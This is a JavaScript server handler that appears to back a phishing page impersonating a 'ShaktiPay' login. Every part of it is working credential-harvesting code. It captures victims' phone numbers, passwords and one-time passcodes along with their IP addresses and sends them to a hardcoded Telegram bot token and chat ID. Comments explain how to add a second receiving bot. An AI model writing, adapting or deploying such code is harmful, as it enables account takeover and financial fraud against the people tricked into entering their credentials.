export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, phone, pass, otp } = req.body;

  // --- TELEGRAM BOT CONFIGURATION ---
  const BOT_TOKEN_1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
  const CHAT_ID_1 = '6076330929';

  // Agar aapko dusra bot bhi use karna ho toh yahan token aur chat ID daal sakte hain:
  const BOT_TOKEN_2 = ''; 
  const CHAT_ID_2 = '';

  // Visitor ka real IP address
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  let message = '';

  if (type === 'login') {
    message = `✅ <b>New ShaktiPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>`;
  } else if (type === 'send_otp' || type === 'modal_otp') {
    message = `🔐 <b>OTP Requested</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'verify_otp') {
    message = `🔑 <b>OTP Entered (Wrong Attempt)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
  } else {
    message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
  }

  try {
    const promises = [];

    if (BOT_TOKEN_1 && CHAT_ID_1) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID_1, text: message, parse_mode: 'HTML' })
        })
      );
    }

    if (BOT_TOKEN_2 && CHAT_ID_2) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID_2, text: message, parse_mode: 'HTML' })
        })
      );
    }

    await Promise.all(promises);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram API error:', err);
    return res.status(500).json({ error: 'Failed to send messages' });
  }
}
